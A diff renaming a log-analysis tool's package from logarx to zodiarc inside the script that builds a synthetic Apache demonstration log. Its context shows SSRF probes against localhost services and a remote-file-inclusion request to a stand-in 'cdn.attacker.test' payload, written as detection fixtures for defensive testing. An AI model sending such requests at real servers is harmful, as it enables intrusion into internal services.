@@ -10,12 +10,12 @@ bytes and the file can be checksummed like any other fixture.
 **It is a demonstration log.** Every client in it exists to make one feature of
 the application visible — a window rule that needs a burst, a payload that needs
 decoding, a session that needs to be cut in two. Reading the cast below is a
-fair summary of what logarx can show you.
+fair summary of what zodiarc can show you.
 
 **It is not an evaluation corpus, and it must never become one.** Scoring the
 rules against traffic written to suit them is marking your own homework, which
 is the objection ADR-0007 raises and ADR-0008 answers. That is why no truth file
-ships beside it: `logarx-dev evaluate` wants one, cannot have one here, and should
+ships beside it: `zodiarc-dev evaluate` wants one, cannot have one here, and should
 go on using the real labelled log under `tests/data/apache-shopfront/` instead.
 
 ## Why vhost-combined and not plain combined
@@ -27,7 +27,7 @@ those quietly unreachable, which is the wrong thing for a file whose whole job
 is to show what works.
 
 `%u` is populated for one client for the same reason: it is in every Apache
-format, it holds the authenticated username, and logarx currently discards it.
+format, it holds the authenticated username, and zodiarc currently discards it.
 Having a line that carries one makes that visible rather than theoretical.
 
 ## Keeping it current
@@ -274,14 +274,14 @@ def window_shopper(ip: str, day: int, hour: int) -> None:
     **"wall bracket" is not a coincidence — do not change these search terms.**
 
     Ingest alone reads all five searches as ordinary shopping. Turn CRS on with
-    `logarx-dev enrich` and rule 932236 calls `wall bracket` a Unix command
+    `zodiarc-dev enrich` and rule 932236 calls `wall bracket` a Unix command
     injection, at critical severity, three times — because `wall` is a real Unix
     command and CRS is matching the command name followed by an argument.
 
     Nothing is wrong with CRS here; it is doing what a generic ruleset must do
     without knowing that this site sells brackets. This client was written to
     show a hardware shop's customer being filed as an attacker by the most
-    widely deployed WAF ruleset in the world, and until 2026-09-22 logarx
+    widely deployed WAF ruleset in the world, and until 2026-09-22 zodiarc
     repeated the accusation.
 
     It no longer does. Measured on 237,278 real requests, 932236 accused 22
@@ -370,7 +370,7 @@ def signed_in_admin(ip: str, day: int, hour: int, *, session_expired: bool = Fal
     """The only client whose lines carry a username, and it is there to be a
     question rather than a feature.
 
-    `%u` is in every Apache format and logarx drops it — the parser reads it and
+    `%u` is in every Apache format and zodiarc drops it — the parser reads it and
     `NormalizedEvent` has nowhere to put it. Idea 23 on the board is about
     grouping by who rather than by where, and this client is what that idea
     would have to work from. Meanwhile it also gives `admin_area_probe` a
@@ -971,7 +971,7 @@ def ssrf_attempts(ip: str, day: int, hour: int) -> None:
         "/fetch?url=gopher%3A//127.0.0.1%3A11211/_stats",
         # Not an internal address at all — somebody else's server, which is
         # remote file inclusion rather than SSRF-to-self. It is the one probe
-        # here that logarx cannot judge on its own: `/fetch?url=` to
+        # here that zodiarc cannot judge on its own: `/fetch?url=` to
         # `https://shop.test/...` would be ordinary, and only knowing that
         # shop.test is this site makes cdn.attacker.test different.
         "/fetch?url=https%3A//cdn.attacker.test/payload.txt",
@@ -1215,16 +1215,16 @@ def check() -> int:
     triggers is meant to show up here as a failure, not to be noticed a year
     later when somebody wonders why the demo never mentions it.
 
-    logarx is imported inside this function on purpose. Generating the log needs
+    zodiarc is imported inside this function on purpose. Generating the log needs
     nothing but the standard library, and it should stay that way: the file has
     to be rebuildable even from a checkout where the package will not import.
     """
-    from logarx.detect.engine import RuleEngine
-    from logarx.detect.rules import load_rules
-    from logarx.parsers.registry import get_parser
+    from zodiarc.detect.engine import RuleEngine
+    from zodiarc.detect.rules import load_rules
+    from zodiarc.parsers.registry import get_parser
 
     root = Path(__file__).resolve().parents[2]
-    rules = load_rules([root / "src" / "logarx" / "detect" / "rulepacks"])
+    rules = load_rules([root / "src" / "zodiarc" / "detect" / "rulepacks"])
     # Built knowing the site's own name, because one rule is deliberately silent
     # until somebody supplies it: `rfi_offsite_url` compares a URL in a
     # parameter against the hosts the reader named, and with nothing named it
@@ -1237,7 +1237,7 @@ def check() -> int:
     # and in time order — a burst is only a burst relative to its neighbours.
     from collections import defaultdict
 
-    from logarx.core.evidence import EvidenceRef
+    from zodiarc.core.evidence import EvidenceRef
 
     by_client = defaultdict(list)
     for number, text in enumerate(OUT.read_text(encoding="utf-8").splitlines(), start=1):
